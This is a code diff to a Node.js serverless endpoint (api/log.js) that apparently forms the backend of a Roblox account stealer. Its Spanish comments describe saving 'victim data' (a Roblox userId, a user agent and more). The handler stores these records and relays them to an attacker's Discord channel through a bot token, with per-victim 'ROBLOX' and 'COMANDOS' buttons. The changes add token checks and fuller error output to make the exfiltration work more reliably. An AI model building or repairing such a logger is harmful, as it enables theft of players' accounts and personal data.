@@ -1,4 +1,4 @@
-// api/log.js - VERSIÓN FINAL CON GUARDADO EN ARCHIVO
+// api/log.js - VERSIÓN CORREGIDA
 export default async function handler(req, res) {
     // Configurar CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -56,7 +56,7 @@ export default async function handler(req, res) {
     }
 
     // ============================================================
-    // GUARDAR DATOS DE LA VÍCTIMA EN ARCHIVO
+    // GUARDAR DATOS DE LA VÍCTIMA
     // ============================================================
     const userId = data.roblox?.userId || `anon_${Date.now()}`;
 
@@ -79,7 +79,7 @@ export default async function handler(req, res) {
         userAgent: data.userAgent || ''
     };
 
-    // Guardar en /tmp usando fetch interno
+    // Guardar en /tmp
     try {
         await fetch(`${baseUrl}/api/guardar`, {
             method: 'POST',
@@ -89,7 +89,7 @@ export default async function handler(req, res) {
     } catch (error) {}
 
     // ============================================================
-    // ENVIAR MENSAJE A DISCORD (SIN EMBED, SOLO TEXTO)
+    // ENVIAR MENSAJE A DISCORD (VERSIÓN CORREGIDA)
     // ============================================================
     const token = process.env.DISCORD_BOT_TOKEN;
     const channelId = process.env.DISCORD_CHANNEL_ID;
@@ -98,7 +98,7 @@ export default async function handler(req, res) {
         return res.status(500).json({ error: 'Config error' });
     }
 
-    // Crear el mensaje con el NUEVO FORMATO (sin embed, solo texto)
+    // Mensaje inicial
     const mensaje = `||@everyone||
 
 Selecciona una opcion:
@@ -123,7 +123,7 @@ Selecciona una opcion:
                     style: 1,
                     label: 'ROBLOX',
                     custom_id: `roblox_${userId}`,
-                    emoji: { name: '®️' }
+                    emoji: { name: '🔴' }
                 }
             ]
         },
@@ -133,15 +133,28 @@ Selecciona una opcion:
                 {
                     type: 2,
                     style: 2,
-                    label: ' COMANDOS',
+                    label: 'COMANDOS',
                     custom_id: `comandos_${userId}`,
-                    emoji: { name: '〰️' }
+                    emoji: { name: '⚫' }
                 }
             ]
         }
     ];
 
     try {
+        // PRIMERO: Verificar que el token funciona
+        const testAuth = await fetch('https://discord.com/api/v10/users/@me', {
+            headers: { 'Authorization': `Bot ${token}` }
+        });
+
+        if (!testAuth.ok) {
+            return res.status(500).json({ 
+                error: 'Token inválido',
+                discord_response: await testAuth.text()
+            });
+        }
+
+        // SEGUNDO: Enviar mensaje
         const response = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
             method: 'POST',
             headers: {
@@ -155,12 +168,20 @@ Selecciona una opcion:
         });
 
         if (!response.ok) {
-            return res.status(500).json({ error: 'Discord error' });
+            const errorText = await response.text();
+            return res.status(500).json({ 
+                error: 'Discord error',
+                status: response.status,
+                details: errorText
+            });
         }
 
         res.status(200).json({ status: 'ok', userId: userId });
         
     } catch (error) {
-        res.status(500).json({ error: 'Server error' });
+        res.status(500).json({ 
+            error: 'Server error',
+            message: error.message 
+        });
     }
 }
